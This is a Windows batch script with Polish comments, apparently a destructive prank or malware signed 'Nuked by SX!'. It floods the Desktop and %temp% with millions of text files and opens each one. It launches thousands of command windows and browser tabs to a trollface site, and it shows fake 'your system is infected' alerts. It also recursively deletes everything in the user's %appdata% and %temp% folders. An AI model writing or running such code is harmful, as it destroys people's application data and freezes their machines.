@echo off
cd %userprofile%\Desktop

REM Tworzenie i otwieranie plików tekstowych na pulpicie
for /l %%i in (1, 1, 9999999) do (
    echo Nuked by SX! %%i > Nuked_by_SX%%i.txt
    start Nuked_by_SX%%i.txt
)

REM Otwieranie terminala 9999 razy
for /l %%i in (1, 1, 9999) do (
    start cmd.exe
)

REM Otwieranie przeglądarki 9999 razy
for /l %%i in (1, 1, 9999) do (
    start "https://trollface.dk/" "https://trollface.dk/"
    start "https://trollface.dk/" "https://trollface.dk/"
)

REM Wyskakujące komunikaty Windows Error
for /l %%i in (1, 1, 100) do (
    msg * "Uwaga! Twój system został zainfekowany!"
)

REM Usuwanie zawartości folderu %appdata%
cd %appdata%
del /s /q *.*
for /d %%i in (*) do rd /s /q "%%i"

REM Usuwanie zawartości folderu %temp%
cd %temp%
del /s /q *.*
for /d %%i in (*) do rd /s /q "%%i"

REM Tworzenie i otwieranie plików tekstowych w %appdata%
cd %temp%
for /l %%i in (1, 1, 9999999) do (
    echo Nuked by SX! %%i > Nuked_by_SX%%i.txt
    start Nuked_by_SX%%i.txt
)

